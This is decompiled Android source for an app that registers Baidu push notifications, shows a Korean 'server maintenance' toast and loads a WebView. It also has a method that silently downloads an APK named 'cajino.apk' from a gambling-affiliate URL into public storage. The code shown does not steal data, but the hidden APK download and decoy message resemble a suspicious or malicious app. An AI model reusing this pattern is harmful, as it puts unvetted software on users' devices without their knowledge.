package ca.ji.no.method10;

import android.annotation.SuppressLint;
import android.annotation.TargetApi;
import android.app.DownloadManager;
import android.app.DownloadManager.Request;
import android.content.res.Resources;
import android.net.Uri;
import android.os.Bundle;
import android.support.v7.app.ActionBarActivity;
import android.view.Menu;
import android.view.MenuItem;
import android.webkit.WebSettings.ZoomDensity;
import android.webkit.WebView;
import android.widget.Toast;
import com.baidu.android.pushservice.CustomPushNotificationBuilder;
import com.baidu.android.pushservice.PushConstants;
import com.baidu.android.pushservice.PushManager;

public class MainActivity extends ActionBarActivity {
    private UpdataInfo info;
    private DownloadManager mgr = null;
    private WebView webview;

    /* access modifiers changed from: protected */
    public void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        Resources resource = getResources();
        String pkgName = getPackageName();
        setContentView((int) R.layout.main);
        this.webview = (WebView) findViewById(R.id.webview);
        this.mgr = (DownloadManager) getSystemService("download");
        if (!Utils.hasBind(getApplicationContext())) {
            PushManager.startWork(getApplicationContext(), 0, Utils.getMetaValue(this, "api_key"));
        }
        Utils.setBind(getApplicationContext(), true);
        CustomPushNotificationBuilder cBuilder = new CustomPushNotificationBuilder(resource.getIdentifier("notification_custom_builder", "layout", pkgName), resource.getIdentifier("notification_icon", "id", pkgName), resource.getIdentifier(PushConstants.EXTRA_NOTIFICATION_TITLE, "id", pkgName), resource.getIdentifier("notification_text", "id", pkgName));
        cBuilder.setNotificationFlags(16);
        cBuilder.setNotificationDefaults(3);
        cBuilder.setStatusbarIcon(getApplicationInfo().icon);
        cBuilder.setLayoutDrawable(resource.getIdentifier("simple_notification_icon", "drawable", pkgName));
        PushManager.setNotificationBuilder(this, 1, cBuilder);
        this.webview.getSettings().setJavaScriptEnabled(true);
        Toast.makeText(this, "써버교체중입니다   오늘저녁 9시부터 사용가능합니다", 1).show();
        this.webview.getSettings().setDefaultZoom(ZoomDensity.FAR);
        this.webview.getSettings().setBuiltInZoomControls(true);
        this.webview.loadUrl("");
    }

    public boolean onCreateOptionsMenu(Menu menu) {
        getMenuInflater().inflate(R.menu.main, menu);
        return true;
    }

    private String getUrl() {
        String realUrl = null;
        try {
            this.info = new UpdataInfoService(this).getUpdataInfo(R.string.updataurl);
            realUrl = this.info.getApkurl();
            System.out.println(realUrl);
            System.out.println(realUrl);
            System.out.println(realUrl);
            System.out.println(realUrl);
            return realUrl;
        } catch (Exception e) {
            e.printStackTrace();
            return realUrl;
        }
    }

    /* access modifiers changed from: protected */
    @SuppressLint({"NewApi"})
    @TargetApi(9)
    public void downLoadMobileVersion() {
        DownloadManager downloadManager = (DownloadManager) getSystemService("download");
        Request request = new Request(Uri.parse("http://mobile-resigner.valueactive.eu/launch88livedealer/apk?btag1=6526000&btag2=488"));
        request.setDestinationInExternalPublicDir("cajino", "cajino.apk");
        long downloadId = downloadManager.enqueue(request);
    }

    public boolean onOptionsItemSelected(MenuItem item) {
        if (item.getItemId() == R.id.action_settings) {
            return true;
        }
        return super.onOptionsItemSelected(item);
    }
}
